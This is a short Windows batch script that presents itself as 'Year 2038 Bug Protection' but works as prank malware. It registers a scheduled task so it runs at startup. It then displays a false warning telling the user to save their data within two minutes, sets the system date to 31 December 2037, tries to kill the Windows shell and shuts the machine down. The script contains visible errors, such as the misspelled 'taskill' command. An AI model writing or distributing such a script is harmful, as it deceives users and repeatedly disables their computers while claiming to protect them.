@echo off
color 4c
title Year 2038 Bug Protection
schtasks /Create /XML "C:\Program Files\Mant08\Y2038BUG\Tasks\Bug2038 Protection StartUp_After_Vista_Later.xml" /TN "Bug2038 Protection StartUp_After_Vista_Later"
echo You are about to reach the limit of 32-bit systems, for storing time and date.
echo Save all your information, within 2 minutes. You can retrive the information later, by an other , non 32-bit computer.
TIMEOUT /t 120 >null
date 12-31-2037
time 11:00 AM
taskill /f /im explorer.exe
shutdown.exe /s /t 1
